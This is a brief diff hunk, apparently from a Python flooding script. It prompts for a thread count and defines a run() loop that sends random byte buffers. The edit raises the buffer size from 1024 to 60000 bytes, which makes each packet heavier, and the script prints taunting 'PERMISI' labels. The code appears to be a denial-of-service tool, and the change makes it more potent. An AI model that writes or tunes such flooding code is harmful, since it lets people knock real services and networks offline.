@@ -41,7 +41,7 @@ threads = int(input(" Threads:"))
 
 os.system("clear")
 def run():
-	data = random._urandom(1024)
+	data = random._urandom(60000)
 	i = random.choice(("[PERMISI!!!","[PERMISI!!]","[PERMISI!!]"))
 	while True:
 		try:
